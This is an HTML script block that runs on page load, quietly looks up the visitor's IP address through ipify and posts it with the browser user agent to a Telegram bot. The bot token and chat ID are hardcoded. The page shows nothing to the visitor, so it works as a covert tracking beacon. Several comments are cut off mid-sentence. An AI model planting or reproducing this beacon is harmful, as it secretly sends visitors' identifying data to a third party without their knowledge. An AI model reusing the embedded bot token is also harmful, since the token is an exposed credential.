<script>
  // Replace with your own values
  var BOT_TOKEN = "5943003013:AAFy8TH8ZkIOi1kyQosVciuDSYSxBXUUc50";
  var CHAT_ID = "2013299047";

  // Get the visitor's IP address and timezone
  function getVisitorIP() {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "https://api.ipify.org?format=json", false);
    xmlHttp.send(null);
    return JSON.parse(xmlHttp.responseText);
  }

  // Get 
  function getVisitorDeviceInfo() {
    // This 
    // You 
    return navigator.userAgent;
  }

  // Send a message to your Telegram bot
  function sendMessage() {
    var visitorData = getVisitorIP();
    var request = new XMLHttpRequest();
    request.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
    request.setRequestHeader("Content-Type", "application/json");
    request.send(JSON.stringify({
      "chat_id": CHAT_ID,
      "text": "Your HTML file was opened by a visitor with the following information:\n" +
              "IP address: " + visitorData.ip + "\n" +
              "Device: " + getVisitorDeviceInfo()
    }));
  }

  // Call the sendMessage() function when the page is loaded
  window.onload = sendMessage;
</script>
